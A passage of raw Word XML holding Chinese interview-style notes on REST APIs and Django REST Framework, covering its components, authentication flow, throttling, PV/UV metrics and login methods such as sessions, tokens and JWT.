      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>是系统的接口对外一种承诺(而不是实现)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF49B4A" w14:textId="32EEA952"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承诺只要调用接口成功，外部多次调用对系统的影响都是一致的，不会对资源重复操作</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF635C2" w14:textId="68B519BF" w:rsidR="00191162" w:rsidRPr="000F657C" w:rsidRDefault="000F657C" w:rsidP="000F657C">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10</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>为什么要使用</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06791F15" w14:textId="724AA091" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>系统间为了调用数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FAA26AB" w14:textId="5281A286"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数据传输格式：json和xml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9A573E" w14:textId="2A079D87" w:rsidR="00191162"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11</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为什么要使用</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5511DFBB" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">能自动生成符合 RESTful 规范的 API </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C0ECAA" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">1.在开发REST API的视图中，虽然每个视图具体操作的数据不同， 但增、删、改、查的实现流程基本一样,这部分的代码可以简写 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69440687" w14:textId="77777777" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2.在序列化与反序列化时，虽然操作的数据不同，但是执行的过程却相似,这部分的代码也可以简写 REST framework可以帮助简化上述两部分的代码编写，大大提高REST API的开发速度</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BB61E6" w14:textId="0E04CC0B" w:rsidR="00191162"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012</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django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架中都有哪些组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18753E33" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">1.序列化组件:serializers 对queryset序列化以及对请求数据格式校验 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E9ED824" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">2.路由组件routers 进行路由分发 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0128252F" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">3.视图组件ModelViewSet 帮助开发者提供了一些类，并在类中提供了多个方法 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06EA9F4E" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">4.认证组件 写一个类并注册到认证类(authentication_classes)，在类的的authticate方法中编写认证逻 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573FD7A6" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">5.权限组件 写一个类并注册到权限类(permission_classes)，在类的的has_permission方法中编写认证逻辑。 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D1F2D8" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">6.频率限制 写一个类并注册到频率类(throttle_classes)，在类的的allow_request/wait 方法中编写认证逻辑 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0368EFA4" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">7.解析器 选择对数据解析的类，在解析器类中注册(parser_classes) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7498F82C" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">8.渲染器 定义数据如何渲染到到页面上,在渲染器类中注册(renderer_classes) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9C02B4" w14:textId="77777777" w:rsidR="008B2DE0" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">9.分页 对获取到的数据进行分页处理, pagination_class </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA7B43C" w14:textId="2B75A732" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">10.版本 版本控制用来在不同的客户端使用不同的行为 在url中设置version参数，用户请求时候传入参数。在request.version中获取版本，根据版本不同 做不同处理 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BA290F" w14:textId="1E8DB63B" w:rsidR="00191162"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13</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简述</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>框架的认证流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C5CDF5" w14:textId="33350ED8" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户请求走进来后,走APIView,初始化了默认的认证方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="077B21F9" w14:textId="00FF7375" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>走到APIView的dispatch方法,initial方法调用了request.user</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D30B80" w14:textId="1C856A19" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果我们配置了认证类,走我们自己认证类中的authentication方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="506CF043" w14:textId="008BB993" w:rsidR="00191162"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014</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django rest framework</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>如何实现用户的访问频率控制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27EC5E4D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#使用IP/用户账号作为键，每次的访问时间戳作为值，构造一个字典形式的数据，存起来，每次访问时对时间戳列表的元素进行判断，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8DAF8F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">#把超时的删掉，再计算列表剩余的元素数就能做到频率限制了 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4A0E1B" w14:textId="31EA8218" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="00191162" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>#匿名用户：使用IP控制，但是无法完全控制，因为用户可以换代理IP登录用户：使用账号控制，但是如果有很多账号，也无法限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A0C24DB" w14:textId="24F13953" w:rsidR="00191162" w:rsidRDefault="008B2DE0" w:rsidP="008B2DE0">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>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15</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给用户提供一个接口之前需要提前做什么</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEED9EC" w14:textId="5FA71284" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>跟前端进行交互，确定前端要什么</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2B1005" w14:textId="277E4472"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把需求写成文档保存</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B126F20" w14:textId="74C6EA64" w:rsidR="00191162"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016</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PV</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>UV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3DFA44" w14:textId="5A2CE44A" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>PV：页面访问量，每打开一次页面PV计算+1，页面刷新也是</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB6BBCC" w14:textId="0D8984D5"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UV：独立访问数，一台电脑终端为一个访客</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164F6AB0" w14:textId="5DA3F74F" w:rsidR="00191162"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17</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如何实现用户的登录认证</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBC92DD" w14:textId="3CDC31E3" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用cookie session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005B1995" w14:textId="5753AA51"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token 登录成功后生成加密字符串</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F10ED1" w14:textId="5812F586" w:rsidR="00191162" w:rsidRPr="008A1DE1" w:rsidRDefault="008A1DE1" w:rsidP="008A1DE1">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>JWT：json web token 缩写 它将用户信息加密到token中，服务器不保存任何用户信息</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>服务器通过使用保存的秘钥来验证token的正确性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D24FC7" w14:textId="3B66F8A7" w:rsidR="00191162"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18</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MVC</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="008B2DE0">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MTV</w:t>
      </w:r>
    </w:p>
